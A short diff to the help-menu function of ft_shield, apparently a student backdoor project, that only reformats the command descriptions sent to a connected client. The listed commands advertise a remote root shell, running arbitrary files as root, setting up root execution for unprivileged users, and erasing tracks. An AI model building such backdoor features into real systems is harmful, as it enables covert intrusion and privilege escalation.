@@ -427,12 +427,12 @@ void	Ft_Shield::_help(int fd)
 	std::string	help;
 
 	help = "ft_shield list of commands:\n";
-	help += "\t- shutdown : terminate ft_shield and erase tracks\n";
-	help += "\t- quit     : disconnect you from ft_shield\n";
-	help += "\t- rev      : open a shell with root rights\n";
-	help += "\t- elfAsRoot: run any file with root priviliges\n";
-	help += "\t- rootLike : modify file permissions to run an elf as root by a non priviliged user\n";
-	help += "\t- clean log : remove the log file and create a new one,\n"; 
+	help += "\t- shutdown  : terminate ft_shield and erase tracks\n";
+	help += "\t- quit      : disconnect you from ft_shield\n";
+	help += "\t- rev       : open a shell with root rights\n";
+	help += "\t- elfAsRoot : run any file with root priviliges\n";
+	help += "\t- rootLike  : modify file permissions to run an elf as root by a non priviliged user\n";
+	help += "\t- clean log : remove the log file and create a new one\n"; 
 	send(fd, help.c_str(), help.length(), 0);
 	return;
 }
